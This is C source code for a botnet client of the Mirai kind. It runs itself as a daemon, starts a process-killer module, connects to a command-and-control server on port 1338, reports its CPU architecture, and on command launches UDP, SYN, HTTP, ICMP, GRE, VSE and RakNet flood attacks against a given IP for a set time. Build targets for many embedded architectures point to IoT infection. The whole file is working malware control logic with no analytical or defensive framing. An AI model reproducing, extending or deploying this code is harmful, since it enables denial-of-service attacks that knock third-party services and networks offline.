#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include "headers/syn_attack.h"
#include "headers/udp_attack.h"
#include "headers/http_attack.h"
#include "headers/socket_attack.h"
#include "headers/vse_attack.h"
#include "headers/raknet_attack.h"
#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/icmp_attack.h"
#include "headers/killer.h"
#include "headers/gre_attack.h"

#define CNC_IP "0.0.0.0"
#define BOT_PORT 1338
#define MAX_THREADS 1

const char* get_arch() {
    #ifdef ARCH_aarch64
    return "aarch64";
    #elif defined(ARCH_arm)
    return "arm";
    #elif defined(ARCH_m68k)
    return "m68k";
    #elif defined(ARCH_mips)
    return "mips";
    #elif defined(ARCH_mipsel)
    return "mipsel";
    #elif defined(ARCH_powerpc64)
    return "powerpc64";
    #elif defined(ARCH_sh4)
    return "sh4";
    #elif defined(ARCH_sparc)
    return "sparc";
    #elif defined(ARCH_x86_64)
    return "x86_64";
    #elif defined(ARCH_i686)
    return "i686";
    #else
    return "unknown";
    #endif
}

void handle_command(const char *command, int sock) {
    static attack_params* params = NULL;
    static pthread_t threads[MAX_THREADS];

    if (!command || strlen(command) > 1023) return;
    for (size_t i = 0; i < strlen(command); i++) {
        if ((unsigned char)command[i] < 0x09 || ((unsigned char)command[i] > 0x0D && (unsigned char)command[i] < 0x20) || (unsigned char)command[i] > 0x7E) {
            return;
        }
    }

    if (strcmp(command, "ping") == 0) {
        char buffer[256];
        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    int is_attack = 0;
    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
    int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
    int which = -1;
    for (int i = 0; i < 8; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            is_attack = 1;
            which = i;
            break;
        }
    }

    if (is_attack) {
        char ip[32] = {0};
        char argstr[512] = {0};
        int n = 0;
        int port = 0;
        int time = 0;
        int psize = 0;
        int srcport = 0;
        int gre_proto = 0;
        int gport = 0;

        if (which == 6) {
            n = sscanf(command, "%*s %31s %d %[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else if (which == 7) { // gre
            n = sscanf(command, "%*s %31s %d %[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else {
            n = sscanf(command, "%*s %31s %d %d %[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        }

        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) {
                    psize = atoi(token + 6);
                } else if (strncmp(token, "srcport=", 8) == 0) {
                    srcport = atoi(token + 8);
                } else if (which == 7 && strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                } else if (which == 7 && strncmp(token, "gport=", 6) == 0) {
                    gport = atoi(token + 6);
                }
                token = strtok(NULL, " ");
            }
        }

        if (params) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_join(threads[i], NULL);
            }
            free(params);
            params = NULL;
        }

        if (which == 7) { // gre
            gre_attack_params *gre_params = malloc(sizeof(gre_attack_params));
            if (!gre_params) return;
            gre_params->active = 1;
            gre_params->duration = time;
            gre_params->target_addr.sin_family = AF_INET;
            gre_params->target_addr.sin_addr.s_addr = inet_addr(ip);
            gre_params->target_addr.sin_port = htons(gport);
            gre_params->psize = psize;
            gre_params->srcport = srcport;
            gre_params->gre_proto = gre_proto;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_create(&threads[i], NULL, gre_attack, gre_params);
            }
            sleep((unsigned int)time);
            gre_params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(gre_params);
            return;
        }

        params = malloc(sizeof(attack_params));
        if (!params) return;

        params->active = 1;
        params->duration = time;
        params->target_addr.sin_family = AF_INET;
        params->target_addr.sin_addr.s_addr = inet_addr(ip);
        params->target_addr.sin_port = htons(port);
        params->psize = psize;
        params->srcport = srcport;

        for (int i = 0; i < MAX_THREADS; i++) {
            switch (which) {
                case 0: pthread_create(&threads[i], NULL, udp_attack, params); break;
                case 1: pthread_create(&threads[i], NULL, vse_attack, params); break;
                case 2: pthread_create(&threads[i], NULL, syn_attack, params); break;
                case 3: pthread_create(&threads[i], NULL, socket_attack, params); break;
                case 4: pthread_create(&threads[i], NULL, http_attack, params); break;
                case 5: pthread_create(&threads[i], NULL, raknet_attack, params); break;
                case 6: pthread_create(&threads[i], NULL, icmp_attack, params); break;
            }
        }
        sleep((unsigned int)time);
        params->active = 0;
        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_cancel(threads[i]);
        }
        free(params);
        params = NULL;
        return;
    }

    if (strcmp(command, "stop") == 0) {
        if (params != NULL) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
        return;
    }
}

int main(int argc, char** argv) {
    daemonize(argc, argv);
    start_killer();

    int sock;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int attempts = 0;
    while (attempts < 13) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return 1;
        }

        int optval = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            attempts++;
            sleep(5);
            continue;
        }

        const char* arch = get_arch();
        send(sock, arch, strlen(arch), 0);

        attempts = 0;

        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (len <= 0) {
                close(sock);
                break;
            }
            buffer[len] = 0;
            int valid = 1;
            for (int i = 0; i < len; i++) {
                if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
                    valid = 0;
                    break;
                }
            }
            if (!valid) {
                close(sock);
                break;
            }
            handle_command(buffer, sock);
        }
    }

    close(sock);
    return 0;
}
